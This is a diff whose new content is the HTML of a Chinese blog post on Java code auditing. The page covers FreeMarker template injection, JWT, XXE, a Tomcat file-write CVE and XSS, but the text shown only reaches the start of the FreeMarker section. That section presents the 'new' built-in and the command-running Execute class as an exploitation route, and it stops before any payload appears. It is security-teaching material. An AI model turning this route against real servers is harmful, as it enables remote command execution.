@@ -1,88 +1,459 @@
-.post-block {
-  color: var(--hty-text-color);
-  margin: 0 1rem;
-  padding: 1rem;
-  background-color: var(--post-block-bg-color);
-mobile()
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="RoboTerh"><meta name="copyright" content="RoboTerh"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>Java代码审计(二) | RoboTerh</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.25/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".post-content img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
 }
-.post-body {
-  padding: 0 5rem;
-tablet()
-mobile()
-}
-.post-content {
-  padding: 20px 0px;
-}
-.post-meta {
-  font-size: 14px;
-  color: var(--hty-secondary-text-color);
-}
-.post-meta .icon {
-  margin-bottom: -1px;
-}
-.post-description {
-  font-weight: normal;
-  padding: 0.5rem;
-}
-.post-author {
-  display: flex;
-  justify-content: center;
-}
-.post-author .author-avatar {
-  display: inline-flex;
-  justify-content: center;
-  align-items: center;
-  line-height: 0;
-}
-.post-author .author-avatar img {
-  border-radius: 50%;
-  height: 1rem;
-  width: 1rem;
-  padding: 2px;
-  border: 2px solid #d3d3d3;
-}
-.post-author .author-name {
-  margin-left: 0.5rem;
-  font-size: 1rem;
-}
-.post-meta-item-icon {
-  display: inline-block;
-  color: var(--text-color, --hty-secondary-text-color);
-}
-.post-meta-divider {
-  height: 25px;
-  color: var(--hty-secondary-text-color);
-  margin: 0 0.5rem;
-}
-.post-eof {
-  margin: 50px auto;
-  width: 50%;
-  height: 1px;
-  background: $blue;
-  opacity: 0.1;
-}
-.post-copyright {
-  font-size: 0.9rem;
-  margin: 2rem 0;
-  padding: 0.5rem 1rem;
-  border-left: 4px solid #ff5252;
-  background-color: var(--hty-bg-color);
-  list-style: none;
-  word-break: break-all;
-  position: relative;
-  overflow: hidden;
-}
-.post-copyright::after {
-  position: absolute;
-  color: #fff;
-  background: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 496 512'%3E%3Cpath fill='gray' d='M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z'/%3E%3C/svg%3E");
-  content: ' ';
-  height: 10rem;
-  width: 10rem;
-  right: -2rem;
-  top: -2rem;
-  opacity: 0.1;
-}
-.tag-name {
-  padding: 0 0.1rem;
-}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
+    const Yun = window.Yun || {};
+    window.CONFIG = {"hostname":"roboterh.github.io","root":"/","title":["ROBO","TERH","BLOG","小站"],"version":"1.7.0","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><script>CONFIG.leancloudVisitors = {"enable":true,"app_id":"QzEMTRDcJM476WmFbFsyqtOV-MdYXbMMI","app_key":"Ovrs8D1mvkchhDyViQ6oVoQq","server_url":"https://roboterh.github.io"}</script><script defer src="/js/analytics/leancloud-visitors.js"></script><meta name="description" content="模板注入FreeMarker模板注入 FreeMarker模板文件和HTML页面一样是静态页面，访问该页面的时候FreeMarker引擎进行解析并动态的替换模板中的内容进行渲染，之后将渲染得到的结果发送到访问者的浏览器中  FreeMarker模板语言(FTL)的组成：  文本：原样输出 插值：这部分的输出会被模板引擎计算得到的值进行替换 FTL标签：与HTML标签类似，他们是给FreeMarke">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java代码审计(二)">
+<meta property="og:url" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/index.html">
+<meta property="og:site_name" content="RoboTerh">
+<meta property="og:description" content="模板注入FreeMarker模板注入 FreeMarker模板文件和HTML页面一样是静态页面，访问该页面的时候FreeMarker引擎进行解析并动态的替换模板中的内容进行渲染，之后将渲染得到的结果发送到访问者的浏览器中  FreeMarker模板语言(FTL)的组成：  文本：原样输出 插值：这部分的输出会被模板引擎计算得到的值进行替换 FTL标签：与HTML标签类似，他们是给FreeMarke">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220117204448845.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220117212929376.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220121205944669.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220121212408813.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220121212500257.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220121212700880.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220121214235149.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220121220404216.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220121220639128.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220121220937657.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220121221415779.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220121222014649.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220228201701750.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220228212134770.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220302133806803.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220302140719178.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220302142703484.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220302143017222.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220302143456792.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220302143642624.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220302143707893.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220302143845118.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220302144539707.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220302145323165.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220302145347813.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220302145854309.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220302160918254.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220302161216763.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220302162730473.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220302162956892.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220302165457421.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220302165733212.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220302165835386.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220303202842846.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220303202936780.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220303203405588.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220303203933794.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220303204239668.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220303204352987.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220303204803948.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220303210206260.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220303210851864.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220303215513035.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220303215534017.png">
+<meta property="og:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220303215611289.png">
+<meta property="article:published_time" content="2022-01-17T09:55:22.000Z">
+<meta property="article:modified_time" content="2022-03-03T14:03:32.767Z">
+<meta property="article:author" content="RoboTerh">
+<meta property="article:tag" content="java代码审计">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://roboterh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/image-20220117204448845.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="RoboTerh"><img width="96" loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/8@XK~G6IIG(3~I6J~C6M4JB.png" alt="RoboTerh"><span class="site-author-status" title="wwww我好菜">-_-</span></a><div class="site-author-name"><a href="/about/">RoboTerh</a></div><span class="site-name">RoboTerh</span><sub class="site-subtitle"></sub><div class="site-desciption">无聊的时候记录记录自己的学习啊</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">27</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">10</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">17</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/F0A770ED0C75BC233DA1034B4C80E8DA.png" title="QQ" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2865153524@qq.com" title="E-Mail" target="_blank" style="color:8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#FreeMarker%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">FreeMarker模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#new%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">new内建函数的利用：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#api%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">api内建函数的利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JWT"><span class="toc-number">2.</span> <span class="toc-text">JWT</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#WebGoat%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="toc-number">2.1.</span> <span class="toc-text">WebGoat的搭建</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JWT%E9%A2%98%E8%A7%A3"><span class="toc-number">2.2.</span> <span class="toc-text">JWT题解</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">XML外部实体注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Dos%E6%94%BB%E5%87%BB"><span class="toc-number">3.1.</span> <span class="toc-text">Dos攻击</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">4.</span> <span class="toc-text">安全配置错误</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Tomcat%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5-CVE-2017-12615"><span class="toc-number">4.1.</span> <span class="toc-text">Tomcat任意文件写入(CVE-2017-12615)</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">4.1.1.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">4.1.2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.1.3.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">4.1.4.</span> <span class="toc-text">原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS"><span class="toc-number">5.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E7%AD%96%E7%95%A5"><span class="toc-number">5.1.</span> <span class="toc-text">审计策略</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">5.2.</span> <span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">5.3.</span> <span class="toc-text">存储型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E7%82%B9"><span class="toc-number">5.3.1.</span> <span class="toc-text">输入点</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E4%BB%A3%E7%A0%81"><span class="toc-number">5.3.2.</span> <span class="toc-text">审计代码</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DOM%E5%9E%8BXSS"><span class="toc-number">5.4.</span> <span class="toc-text">DOM型XSS</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://RoboTerh.github.io/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="RoboTerh"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="RoboTerh"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Java代码审计(二)</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2022-01-17 17:55:22" itemprop="dateCreated datePublished" datetime="2022-01-17T17:55:22+08:00">2022-01-17</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <time title="Modified: 2022-03-03 22:03:32" itemprop="dateModified" datetime="2022-03-03T22:03:32+08:00">2022-03-03</time></div><span class="leancloud_visitors" id="/2022/01/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C/" data-flag-title="Java代码审计(二)"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Views"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/language/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">language</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">java代码审计</span></a><a class="tag-item" href="/tags/java/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">java</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h4 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h4><h5 id="FreeMarker模板注入"><a href="#FreeMarker模板注入" class="headerlink" title="FreeMarker模板注入"></a>FreeMarker模板注入</h5><blockquote>
+<p>FreeMarker模板文件和HTML页面一样是静态页面，访问该页面的时候<code>FreeMarker</code>引擎进行解析并动态的替换模板中的内容进行渲染，之后将渲染得到的结果发送到访问者的浏览器中</p>
+</blockquote>
+<p><code>FreeMarker</code>模板语言(FTL)的组成：</p>
+<ul>
+<li>文本：原样输出</li>
+<li>插值：这部分的输出会被模板引擎计算得到的值进行替换</li>
+<li><code>FTL</code>标签：与HTML标签类似，他们是给<code>FreeMarker</code>指示，而且不会打印在输出内容中</li>
+<li>注释：</li>
+</ul>
+<p>利用方式：</p>
+<ul>
+<li><p>内建函数的利用：</p>
+<p>用法：<code>variable_name?method_name</code></p>
+</li>
+</ul>
+<h6 id="new内建函数的利用："><a href="#new内建函数的利用：" class="headerlink" title="new内建函数的利用："></a><code>new</code>内建函数的利用：</h6><p>查看<code>freemarker.template.utility.Execute</code>的源代码：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Execute</span> <span class="token keyword">implements</span> <span class="token class-name">TemplateMethodModel</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> OUTPUT_BUFFER_SIZE <span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">Execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">List</span> arguments<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TemplateModelException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">StringBuilder</span> aOutputBuffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>arguments<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TemplateModelException</span><span class="token punctuation">(</span><span class="token string">"Need an argument to execute"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            <span class="token class-name">String</span> aExecute <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>arguments<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+                <span class="token class-name">Process</span> exec <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>aExecute<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token class-name">InputStream</span> execOut <span class="token operator">=</span> exec<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
